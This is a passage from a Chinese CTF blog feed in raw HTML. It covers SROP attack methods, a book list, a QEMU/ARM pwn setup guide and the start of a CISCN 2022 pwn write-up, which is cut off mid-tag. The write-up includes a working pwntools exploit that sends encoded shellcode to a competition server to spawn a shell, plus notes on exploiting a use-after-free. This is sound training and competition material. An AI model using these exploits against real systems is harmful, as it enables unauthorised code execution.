class="hljs-type">__uint32_t</span>        mxcr_mask;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpxreg</span>    _<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">xmmreg</span>    _<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>        padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint64_t</span> r8;<br>  <span class="hljs-type">__uint64_t</span> r9;<br>  <span class="hljs-type">__uint64_t</span> r10;<br>  <span class="hljs-type">__uint64_t</span> r11;<br>  <span class="hljs-type">__uint64_t</span> r12;<br>  <span class="hljs-type">__uint64_t</span> r13;<br>  <span class="hljs-type">__uint64_t</span> r14;<br>  <span class="hljs-type">__uint64_t</span> r15;<br>  <span class="hljs-type">__uint64_t</span> rdi;<br>  <span class="hljs-type">__uint64_t</span> rsi;<br>  <span class="hljs-type">__uint64_t</span> rbp;<br>  <span class="hljs-type">__uint64_t</span> rbx;<br>  <span class="hljs-type">__uint64_t</span> rdx;<br>  <span class="hljs-type">__uint64_t</span> rax;<br>  <span class="hljs-type">__uint64_t</span> rcx;<br>  <span class="hljs-type">__uint64_t</span> rsp;<br>  <span class="hljs-type">__uint64_t</span> rip;<br>  <span class="hljs-type">__uint64_t</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>  <span class="hljs-type">__uint64_t</span> err;<br>  <span class="hljs-type">__uint64_t</span> trapno;<br>  <span class="hljs-type">__uint64_t</span> oldmask;<br>  <span class="hljs-type">__uint64_t</span> cr2;<br>  __extension__ <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>      <span class="hljs-type">__uint64_t</span> __fpstate_word;<br>    &#125;;<br>  <span class="hljs-type">__uint64_t</span> __reserved1 [<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h2><h3 id="ç›´æ¥getshell"><a href="#ç›´æ¥getshell" class="headerlink" title="ç›´æ¥getshell"></a>ç›´æ¥getshell</h3><p><strong>ç¤ºæ„å›¾</strong></p><p><img src="/img/article/srop/srop4.png" alt="Untitled"></p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨æ ˆä¸Šä¼ªé€ Signal Frameï¼Œåˆ©ç”¨syscall(0xF)æ¥è§¦å‘å¯¹äºä¼ªé€ å¯„å­˜å™¨çš„æ¢å¤ï¼Œåœ¨<code>setcontext</code> æ‰§è¡Œå®Œæ¯•åï¼Œä¾¿ä¼šgetshellï¼ˆæˆ–åˆ©ç”¨æ ˆè½¬ç§»åˆ°å…¶ä»–åœ°å€ä¹Ÿå¯ä»¥ï¼Œä½†æ— è®ºæ€æ ·éƒ½è¦ä¿è¯åœ¨syscallæ—¶ï¼Œrspéœ€æŒ‡å‘Fake Frame çš„å¼€å¤´)</p><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>åœ¨ä¸Šé¢ç›´æ¥getshellçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥è‡ªç„¶çš„æƒ³åˆ°ï¼Œé€šè¿‡ä¸æ–­ä¼ªé€ sigframeå¯ä»¥å®ç°ç±»ä¼¼ROPçš„æ•ˆæœï¼Œåªéœ€è¦å°†å…¶ä¸­rspæ§åˆ¶åˆ°ä¸‹ä¸€ä¸ªfakeframeçš„å¼€å¤´,ripåŠ ä¸Šretå³å¯ã€‚</p><p><strong>ç¤ºæ„å›¾</strong></p><p><img src="/img/article/srop/srop5.png" alt="Untitled"></p><h3 id="æ ˆè½¬ç§»"><a href="#æ ˆè½¬ç§»" class="headerlink" title="æ ˆè½¬ç§»"></a>æ ˆè½¬ç§»</h3><p>ç”±äºå…¶å¯ä»¥è½»æ˜“çš„æ§åˆ¶å‡ ä¹æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œæ ˆè½¬ç§»è¿™æ ·çš„æ“ä½œä¹Ÿå¯ä»¥è½»æ¾å®ç°</p><h3 id="å †ä¸­ç›´æ¥åˆ©ç”¨setcontext"><a href="#å †ä¸­ç›´æ¥åˆ©ç”¨setcontext" class="headerlink" title="å †ä¸­ç›´æ¥åˆ©ç”¨setcontext"></a>å †ä¸­ç›´æ¥åˆ©ç”¨setcontext</h3><p>åœ¨é¢å¯¹å †é¢˜ç›®æ—¶ï¼Œæˆ‘ä»¬å¾ˆéš¾ç›´æ¥åœ¨æ ˆä¸Šæ„é€ å†…å®¹å¹¶ä¸”æ§åˆ¶rspæŒ‡å‘frameå¼€å¤´ã€‚æ­¤æ—¶å¯ä»¥ç›´æ¥é€šè¿‡åŠ«æŒhookä¸º<code>setcontext+53</code> å¤„(<strong>mov rsp, [rdi+0A0h]</strong>)ï¼Œç›´æ¥è§¦å‘å¯¹äºå¯„å­˜å™¨çš„ä¸€ç³»åˆ—popæ“ä½œã€‚ä¸”ç”±äºfreeæ—¶ï¼ŒripæŒ‡å‘chunkçš„memåŸŸï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨å°†è¦freeçš„chunké‡Œå†™ä¸ŠFake Frameï¼Œå¹¶åˆç†æ§åˆ¶ä¸ripçš„è·ç¦»å³å¯ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>å¹³å°é¢˜ç›®SROPã€ ciscn 2021 silverwolf</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘çš„å¿…è¯»ä¹¦ç›®è¡¨(ä»åœ¨æ›´æ–°)</title>
    <link href="/2022/06/05/%E3%80%8A%E6%A0%BC%E8%B0%83%EF%BC%9A%E7%A4%BE%E4%BC%9A%E7%AD%89%E7%BA%A7%E4%B8%8E%E7%94%9F%E6%B4%BB%E5%93%81%E5%91%B3%E3%80%8B/"/>
    <url>/2022/06/05/%E3%80%8A%E6%A0%BC%E8%B0%83%EF%BC%9A%E7%A4%BE%E4%BC%9A%E7%AD%89%E7%BA%A7%E4%B8%8E%E7%94%9F%E6%B4%BB%E5%93%81%E5%91%B3%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="ã€Šæ ¼è°ƒï¼šç¤¾ä¼šç­‰çº§ä¸ç”Ÿæ´»å“å‘³ã€‹"><a href="#ã€Šæ ¼è°ƒï¼šç¤¾ä¼šç­‰çº§ä¸ç”Ÿæ´»å“å‘³ã€‹" class="headerlink" title="ã€Šæ ¼è°ƒï¼šç¤¾ä¼šç­‰çº§ä¸ç”Ÿæ´»å“å‘³ã€‹"></a>ã€Šæ ¼è°ƒï¼šç¤¾ä¼šç­‰çº§ä¸ç”Ÿæ´»å“å‘³ã€‹</h2><blockquote><p>ä¸Šä¸–çºªæœ«æœŸç¾å›½ç¤¾ä¼šç»“æ„ï¼Œå¯¹äºç°åœ¨çš„æˆ‘ä»¬ä»æœ‰è®¸å¤šè­¦é†’ä¹‹å¤„ã€‚</p></blockquote><hr><h2 id="ã€ŠåŠ é€Ÿã€‹"><a href="#ã€ŠåŠ é€Ÿã€‹" class="headerlink" title="ã€ŠåŠ é€Ÿã€‹"></a>ã€ŠåŠ é€Ÿã€‹</h2><blockquote><p>æœ¬ä¹¦è®²è§£äº†ç°ä»£ç¤¾ä¼šä¸­æ—¶é—´ç»“æ„çš„æ”¹å˜ï¼Œæ·±å…¥çš„æ­ç¤ºäº†ç°ä»£ç¤¾ä¼šä¸­è®¸å¤šç°è±¡çš„æœ¬è´¨åŸå› ã€‚</p></blockquote><hr><h2 id="ã€Šæ–°å¼‚åŒ–çš„è¯ç”Ÿã€‹"><a href="#ã€Šæ–°å¼‚åŒ–çš„è¯ç”Ÿã€‹" class="headerlink" title="ã€Šæ–°å¼‚åŒ–çš„è¯ç”Ÿã€‹"></a>ã€Šæ–°å¼‚åŒ–çš„è¯ç”Ÿã€‹</h2><blockquote><p>ç¤¾ä¼šåŠ é€Ÿæ‰¹åˆ¤ç†è®ºå¤§çº²ï¼Œè¾©è¯çš„æ€è€ƒå½“ä»£äººä»¬çš„ç”Ÿæ´»ã€‚</p></blockquote><hr><h2 id="ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹"><a href="#ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹" class="headerlink" title="ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹"></a>ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹</h2><blockquote><p>è®¡ç®—æœºåº•å±‚åŸç†,å­¦è®¡ç®—æœºä¸è¯»CSAPPï¼Œç­‰äºæ²¡å­¦ï¼ˆdogeï¼‰ã€‚</p></blockquote><hr><h2 id="ã€ŠC-åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜ã€‹"><a href="#ã€ŠC-åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜ã€‹" class="headerlink" title="ã€ŠC++åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜ã€‹"></a>ã€ŠC++åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜ã€‹</h2><blockquote><p>æœ¬ä¹¦æ—¢æ˜¯ä¸€æœ¬å…¨é¢è€Œç³»ç»Ÿåœ°è®²è§£åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯çš„å®‰å…¨ç±»ä¸“è‘—ï¼Œåˆæ˜¯ä¸€éƒ¨æ·±åˆ»æ­ç¤ºC++å†…éƒ¨å·¥ä½œæœºåˆ¶çš„ç¨‹åºè®¾è®¡ç±»è‘—ä½œã€‚</p></blockquote><hr><h2 id="ã€Šé«˜çº§ç¼–è¯‘å™¨è®¾è®¡ä¸å®ç°ã€‹"><a href="#ã€Šé«˜çº§ç¼–è¯‘å™¨è®¾è®¡ä¸å®ç°ã€‹" class="headerlink" title="ã€Šé«˜çº§ç¼–è¯‘å™¨è®¾è®¡ä¸å®ç°ã€‹"></a>ã€Šé«˜çº§ç¼–è¯‘å™¨è®¾è®¡ä¸å®ç°ã€‹</h2><blockquote><p>æœ¬ä¹¦ä¸šå†…ä¿—ç§°â€œé²¸ä¹¦â€ï¼Œå®ƒæ˜¯ç¼–è¯‘å™¨é¢†åŸŸæœ€ä¸ºç»å…¸çš„ä¸‰æœ¬ä¹¦ä¹‹ä¸€ï¼Œä½†å†…å®¹æ›´çªå‡ºç¼–è¯‘å™¨çš„åç«¯ä¼˜åŒ–éƒ¨åˆ†ã€‚</p></blockquote><hr><h2 id="ã€Šä¹Œåˆä¹‹ä¼—ã€‹"><a href="#ã€Šä¹Œåˆä¹‹ä¼—ã€‹" class="headerlink" title="ã€Šä¹Œåˆä¹‹ä¼—ã€‹"></a>ã€Šä¹Œåˆä¹‹ä¼—ã€‹</h2><blockquote><p>æˆ‘ä»¬ä½œä¸ºç‹¬ç«‹çš„ä¸ªäººï¼Œå¦‚ä½•åœ¨çº·çº·æ‰°æ‰°çš„ä¿¡æ¯ç¤¾ä¼šä¸­ä¿æŒå†·é™ï¼Œä¸è¢«ä¹Œåˆä¹‹ä¼—æ‰€è£¹æŒŸï¼Œè¾©è¯åœ°è¯»å®Œè¿™æœ¬ä¹¦ï¼Œä¿æŒç‹¬ç«‹çš„æ€è€ƒï¼Œç›¸ä¿¡ä½ èƒ½æœ‰æ‰€æ”¶è·ã€‚</p></blockquote><hr><h2 id="ã€Šå¨±ä¹è‡³æ­»ã€‹"><a href="#ã€Šå¨±ä¹è‡³æ­»ã€‹" class="headerlink" title="ã€Šå¨±ä¹è‡³æ­»ã€‹"></a>ã€Šå¨±ä¹è‡³æ­»ã€‹</h2><blockquote><p>åœ¨è¯¥ä¹¦ä¸­ï¼Œæ³¢å…¹æ›¼æ·±å…¥å‰–æäº†ä»¥ç”µè§†ä¸ºä¸»çš„æ–°åª’ä½“å¯¹äººæ€æƒ³è®¤è¯†ã€è®¤çŸ¥æ–¹æ³•ä¹ƒè‡³æ•´ä¸ªç¤¾ä¼šæ–‡åŒ–å‘å±•è¶‹å‘çš„å½±å“ï¼Œä»¤äººæ·±çœï¼Œå¹¶è®¤è¯†åˆ°åª’ä»‹å±æœºã€‚</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>QEMU &amp; arm ç®€æ˜“pwnç¯å¢ƒæ­å»º</title>
    <link href="/2022/06/05/QEMU%20&amp;%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/05/QEMU%20&amp;%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å¡«å‘äº†ï¼Œå¡«å‘äº†ï¼å­¦äº†å †ä¹‹åå¾ˆä¹…æ²¡æœ‰å­¦æ–°ä¸œè¥¿äº†ï¼Œæ¥å…¥é—¨ä¸‹armæ¶æ„ä¸‹çš„PWNï¼Œä¸ºå›½èµ›æ‰“ä¸€ç‚¹åŸºç¡€ã€‚</p></blockquote><h2 id="ç¯å¢ƒæ­å»º-Ubuntu-20-04"><a href="#ç¯å¢ƒæ­å»º-Ubuntu-20-04" class="headerlink" title="ç¯å¢ƒæ­å»º(Ubuntu 20.04)"></a>ç¯å¢ƒæ­å»º(Ubuntu 20.04)</h2><h3 id="å®‰è£…QEMU"><a href="#å®‰è£…QEMU" class="headerlink" title="å®‰è£…QEMU"></a>å®‰è£…QEMU</h3><blockquote><p>QEMUæ˜¯ä¸€ç§é€šç”¨çš„å¼€æºè®¡ç®—æœºä»¿çœŸå™¨å’Œè™šæ‹Ÿå™¨ã€‚QEMUå…±æœ‰ä¸¤ç§æ“ä½œæ¨¡å¼<br><strong>å…¨ç³»ç»Ÿä»¿çœŸ</strong>ï¼šèƒ½å¤Ÿåœ¨ä»»æ„æ”¯æŒçš„æ¶æ„ä¸Šä¸ºä»»ä½•æœºå™¨è¿è¡Œä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿ<br><strong>ç”¨æˆ·æ¨¡å¼ä»¿çœŸ</strong>ï¼šèƒ½å¤Ÿåœ¨ä»»æ„æ”¯æŒçš„æ¶æ„ä¸Šä¸ºå¦ä¸€ä¸ªLinux&#x2F;BSDè¿è¡Œç¨‹åº å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨linuxæ“ä½œç³»ç»Ÿä¸­å®‰è£…å®ƒï¼Œç„¶åç”¨å®ƒæ¥è°ƒè¯•å…¶å®ƒæ¶æ„å¹³å°çš„ç¨‹åºã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##é¦–å…ˆå®‰è£…qemu</span><br>sudo apt update<br>sudo apt install qemu<br></code></pre></td></tr></table></figure><p>å®‰è£…å¥½åå¯ä»¥ç”¨tabè¡¥å…¨çœ‹çœ‹æ˜¯å¦æ­£ç¡®å®‰è£…ã€‚åœ¨å®‰è£…qemuåï¼Œå¯¹äºé™æ€é“¾æ¥çš„armç¨‹åºå°±å·²ç»å¯ä»¥ç›´æ¥è¿è¡Œäº†ï¼Œä½¿ç”¨å‘½ä»¤<code>qemu-arm prog</code>è¿è¡Œ32ä½çš„armç¨‹åºï¼Œå…¶ä¸­progæŒ‡ä»£ç¨‹åºå,å¯¹äº64ä½ç¨‹åºä½¿ç”¨<code>qemu-aarch64</code>ä½†å¯¹äºåŠ¨æ€é“¾æ¥çš„ç¨‹åºè¿˜æ˜¯æ— æ³•æ­£å¸¸è¿è¡Œï¼Œæ­¤æ—¶éœ€è¦å®‰è£…å¯¹åº”æ¶æ„çš„åŠ¨æ€é“¾æ¥åº“æ‰å¯ä»¥æ­£å¸¸è¿è¡Œã€‚</p><p><img src="/img/article/qemu-arm/qemu.png" alt="Untitled"></p><h3 id="å®‰è£…åŠ¨æ€é“¾æ¥åº“"><a href="#å®‰è£…åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="å®‰è£…åŠ¨æ€é“¾æ¥åº“"></a>å®‰è£…åŠ¨æ€é“¾æ¥åº“</h3><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥æœç´¢å¯å®‰è£…çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™é‡Œæˆ‘ä»¬ä»¥64ä½ä¸ºä¾‹ï¼Œå®‰è£…debugç‰ˆæœ¬çš„libc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##æœç´¢libc</span><br>sudo apt search <span class="hljs-string">&quot;libc6&quot;</span> | grep arm<br><span class="hljs-comment">##å®‰è£…libc</span><br>sudo apt install libc6-dbg-arm64-cross<br></code></pre></td></tr></table></figure><p><img src="/img/article/qemu-arm/qemu2.png" alt="Untitled"></p><p>å®‰è£…å®Œåï¼Œåœ¨<code>/usr</code>ç›®å½•ä¸‹ä¼šå‡ºç°<code>aarch64-linux-gnu</code>è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œè¯¥æ–‡ä»¶å¤¹å³å¯¹åº”åˆšå®‰è£…å¥½çš„arm64ä½libcåº“ï¼Œä¹‹åæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŒ‡å®šarmç¨‹åºçš„åŠ¨æ€é“¾æ¥å™¨ï¼Œå³å¯è¿è¡Œç¨‹åºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./prog<br><span class="hljs-comment">## -g ä»£è¡¨ä¸ºç¨‹åºè¿è¡Œåˆ†é…çš„è¿›ç¨‹ç«¯å£å·ï¼Œä¸€èˆ¬ç”¨äºgdbè°ƒè¯•ï¼Œä¸å¡«æ—¶ç³»ç»Ÿè‡ªåŠ¨åˆ†é…</span><br><span class="hljs-comment">## -L ä»£è¡¨åŠ¨æ€é“¾æ¥åº“çš„æ–‡ä»¶å¤¹åœ°å€ï¼Œé™æ€é“¾æ¥ç¨‹åºå¯ä»¥ä¸éœ€è¦</span><br></code></pre></td></tr></table></figure><p><code>qemu-arm</code>æŒ‡çš„æ˜¯<strong>arm32æ¶æ„</strong>ï¼Œç”¨è¿™ä¸ªå‘½ä»¤æ¥è¿è¡Œ32ä½çš„armç¨‹åºï¼Œè€Œ<code>qemu-aarch64</code>å¯¹åº”çš„æ‰æ˜¯<strong>arm64ä½æ¶æ„çš„ç¨‹åº</strong>ï¼Œä¸Šé¢ä¸¤è€…é»˜è®¤éƒ½æ˜¯å°ç«¯ç¨‹åºï¼›<code>qemu-armeb</code>ç”¨æ¥è¿è¡Œ<strong>å¤§ç«¯çš„armç¨‹åº</strong>ã€‚å½“ç„¶åœ¨<strong>ä¸Šé¢å®‰è£…åŒ…æˆªå›¾ä¸­æ˜¾ç¤ºçš„æ˜¯arm64ï¼Œå…¶å®å’Œaarch64æŒ‡çš„æ˜¯åŒä¸€ç§ä½“ç³»ç»“æ„ï¼Œåªä¸è¿‡å‘½åç•¥æœ‰ä¸åŒ</strong>ã€‚</p><h2 id="ä½¿ç”¨gdb-multiarchè¿›è¡Œè°ƒè¯•"><a href="#ä½¿ç”¨gdb-multiarchè¿›è¡Œè°ƒè¯•" class="headerlink" title="ä½¿ç”¨gdb-multiarchè¿›è¡Œè°ƒè¯•"></a>ä½¿ç”¨gdb-multiarchè¿›è¡Œè°ƒè¯•</h2><p>é¦–å…ˆä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…gdb-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update<br>sudo apt install gdb-multiarch<br></code></pre></td></tr></table></figure><p>ä»¥å¹³å°ä¸Šçš„ez-archä¸ºä¾‹ï¼Œæˆ‘ä»¬å…ˆä½¿ç”¨qemuå¯åŠ¨ç¨‹åºï¼Œå¹¶ä¸ºå…¶åˆ†é…ä¸€ä¸ªç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./stack<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¦å¤–ä¸€ä¸ªç»ˆç«¯ï¼Œæ‰“å¼€qemu-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€[loorain@ubuntu] - [~/dest0g3-520/ez-aarch] - [1568]<br>â””â”€[$] sudo gdb-multiarch                                                                             [22:22:12]<br>......<br>......<br>pwndbg&gt; <span class="hljs-built_in">set</span> architecture aarch64<br>The target architecture is assumed to be aarch64<br>pwndbg&gt; target remote localhost:12345<br>Remote debugging using localhost:12345<br>warning: No executable has been specified and target does not support<br>determining executable automatically.  Try using the <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-built_in">command</span>.<br></code></pre></td></tr></table></figure><p><img src="/img/article/qemu-arm/qemu3.png" alt="Untitled"></p><p>å¦å¤–åœ¨pwntoolsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥åŠ¨æ€è°ƒè¯•ç¨‹åºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/aarch64-linux-gnu/&quot;</span>, <span class="hljs-string">&quot;./stack&quot;</span>])<br><span class="hljs-comment">##32armåªéœ€è¦æ›¿æ¢æŒ‡ä»¤ä¸ºqemu-armï¼Œå¹¶æ›´æ¢å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“</span><br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šä¸è¿›è¡Œè°ƒè¯•æ—¶ä¸å»ºè®®ä½¿ç”¨</strong><code>-p</code><strong>ä¸ç„¶å¯èƒ½ä¼šå¯¼è‡´ç¨‹åºåœæ»ï¼Œåªèƒ½ç­‰å¾…gdbé“¾æ¥</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€CISCN2022ã€‘åˆèµ›PWNéƒ¨åˆ†writeup</title>
    <link href="/2022/06/04/ciscn2022/"/>
    <url>/2022/06/04/ciscn2022/</url>
    
    <content type="html"><![CDATA[<h1 id="login-normal"><a href="#login-normal" class="headerlink" title="login-normal"></a>login-normal</h1><p>é¢˜å¦‚å…¶åï¼Œä¸€é“ç®€å•çš„ç­¾åˆ°é¢˜ç›®ï¼Œæ¯”èµ›è¢«æ‰“çƒ‚äº†ã€‚ä¸»è¦åœ¨äºä»£ç åˆ†æï¼Œè¿˜æœ‰å¯æ‰“å°shellcodeçš„åˆ©ç”¨ã€‚è¿™é‡Œæˆ‘ç”¨çš„æ˜¯githubä¸Šä¸€ä¸ªå¤§ä½¬çš„é¡¹ç›®AE64ï¼Œå¯ä»¥ç”¨æ¥ç”Ÿæˆå¯æ‰“å°çš„shellcodeï¼Œç›¸å½“å¥½ç”¨ï¼Œå¼ºæ¨,é“¾æ¥æ”¾åœ¨è¿™é‡Œã€‚</p><blockquote><p> <a href="https://github.com/veritas501/ae64">veritas501&#x2F;ae64: basic amd64 alphanumeric shellcode encoder (github.com)</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># io = process(&#x27;./login&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;59.110.105.63&#x27;</span>, <span class="hljs-number">29289</span>)<br>payload = <span class="hljs-string">b&#x27;msg:ro0t\r\nopt:1\r\n&#x27;</span><br><br>io.sendline(payload)<br><br>sc = AE64()<br><br>shellocde = sc.encode(asm(shellcraft.sh()),<span class="hljs-string">&#x27;rdx&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;msg:&#x27;</span>+shellocde+<span class="hljs-string">b&#x27;\r\nopt:2\r\n&#x27;</span><br><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h1><p> ä¸€é“å †é¢˜ç›®ï¼Œæ¯”èµ›ç»“æŸä¸€ä¸ªå¤šå°æ—¶æ‰å‹‰å¼ºåšå‡ºæ¥ï¼Œéå¸¸å¯æƒœã€‚ä¸»è¦è¿˜æ˜¯ä¸äº†è§£æ–°libcçš„ä¸€äº›è¿›åˆ¶äº†è§£ï¼Œä¸´æ—¶å­¦äº†ä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œæ‰æœ‰ä¸ªåˆæ­¥äº†è§£ã€‚å»ºè®®å…ˆçœ‹å®Œè¿™ç¯‡æ–‡ç« ï¼Œå†æ¥çœ‹æˆ‘çš„wpã€‚</p><blockquote><p> <a href="https://zhuanlan.zhihu.com/p/136983333">Heap Exploit v2.31 | æœ€æ–°å †åˆ©ç”¨æŠ€å·§ï¼Œé€Ÿé€ŸæŸ¥æ”¶ - çŸ¥ä¹ (zhihu.com)</a><br> <a href="http://blog.nsfocus.net/glibc-234/">æµ…è°ˆglibcæ–°ç‰ˆæœ¬ä¿æŠ¤æœºåˆ¶åŠç»•è¿‡æ–¹æ³• â€“ ç»¿ç›Ÿç§‘æŠ€æŠ€æœ¯åšå®¢ (nsfocus.net)</a></p></blockquote><h2 id="ä¼ªä»£ç åˆ†æ"><a href="#ä¼ªä»£ç åˆ†æ" class="headerlink" title="ä¼ªä»£ç åˆ†æ"></a>ä¼ªä»£ç åˆ†æ</h2><p>ç®€å•çœ‹äº†ä¼ªä»£ç åä¸»è¦æœ‰å¦‚ä¸‹å‡ ä¸ªé‡ç‚¹</p><ul><li>freeä¹‹åæ²¡æœ‰ç½®ç©ºï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œå¯ä»¥é€šè¿‡showæ³„éœ²freechunkçš„å†…å®¹</li></ul><p><img src="https://img-blog.csdnimg.cn/509bcd48db954ee2a913e5d325ac2c72.png" alt="img"></p><ul><li><p>æ²¡æœ‰chunkç¼–è¾‘å‡½æ•°ï¼Œåªèƒ½åœ¨mallocçš„æ—¶å€™ç¼–è¾‘chunkå†…å®¹ï¼Œå³æ— æ³•ä¿®æ”¹tcacheçš„flagå†…å®¹ã€‚</p></li><li><p>æœ‰ä¸¤ä¸ªå…¨å±€å˜é‡é™åˆ¶äº†mallocå’Œfreeçš„æ¬¡æ•°ï¼Œfreeä»…èƒ½11æ¬¡ï¼Œmallocæ¬¡æ•°å¾ˆå¤šä¸ç”¨å¤ªæ‹…å¿ƒã€‚</p></li><li><p>æ¯ä¸ªchunkçš„sizeè¢«é™åˆ¶åœ¨0x40ã€‚</p></li></ul><p><img src="https://img-blog.csdnimg.cn/641a2a24c6634e648470ba9c17bacca3.png" alt="img"></p><h2 id="æ€è·¯æ•´ç†"><a href="#æ€è·¯æ•´ç†" class="headerlink" 